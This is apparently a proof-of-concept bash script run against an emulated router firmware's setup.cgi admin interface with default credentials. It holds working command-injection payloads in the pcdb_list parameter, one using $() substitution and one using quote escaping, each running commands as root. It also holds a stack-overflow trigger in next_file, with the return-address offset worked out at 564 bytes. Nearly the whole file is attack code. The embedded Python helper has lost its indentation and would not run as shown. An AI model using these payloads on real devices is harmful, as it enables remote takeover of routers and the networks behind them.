#!/bin/bash
TARGET=${TARGET:-http://127.0.0.1:16358}
AUTH=${AUTH:-admin:password}
SOCK=<rehost-dir>
guest(){ (printf "%s\n" "$1"; sleep 2) | socat -t 8 - UNIX-CONNECT:$SOCK 2>/dev/null | tr -d '\r'; }

echo "=== (a1) pcdb_list \$() 注入 ==="
guest "rm -f /tmp/e1 /tmp/yiyi" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=edit" --data-urlencode "this_file=pc_dba.htm" \
 --data-urlencode 'pcdb_list=Z$(/bin/ps>/tmp/e1)'
sleep 2
echo "--- /tmp/yiyi:"; guest "cat /tmp/yiyi" | tail -3
echo "--- /tmp/e1 (ps 输出头部, 属主 root):"; guest "ls -la /tmp/e1" | tail -2; guest "cat /tmp/e1" | head -4

echo "=== (a2) pcdb_list 引号逃逸注入 ==="
guest "rm -f /tmp/e2" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=edit" --data-urlencode "this_file=pc_dba.htm" \
 --data-urlencode 'pcdb_list=x";/bin/ps>/tmp/e2;"'
sleep 2
echo "--- /tmp/e2:"; guest "ls -la /tmp/e2" | tail -2; guest "cat /tmp/e2" | head -4

echo "=== (b) next_file 栈溢出 (600B De Bruijn, ra=载荷偏移564) ==="
guest "dmesg -c > /dev/null" >/dev/null
SEQ=$(python3 -c "
def db(n):
 a=[0]*64; out=[]
 def f(t,p):
 if t>4:
 if 4%p==0: out.extend(a[1:p+1])
 else:
 a[t]=a[t-p]; f(t+1,p)
 for j in range(a[t-p]+1,4):
 a[t]=j; f(t+1,t)
 f(1,1)
 s=''.join('ABCD'[i] for i in out)
 while len(s)<n: s+=s
 return s[:n]
print(db(1200))")
curl -s -u "$AUTH" --max-time 15 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=edit" --data-urlencode "this_file=fw_rules.htm" \
 --data-urlencode "out_sel=1" --data-urlencode "next_file=${SEQ:0:600}"
sleep 2
echo "--- dmesg:"; guest "dmesg" | grep -E "setup.cgi|epc|SIGSEGV" | tail -4
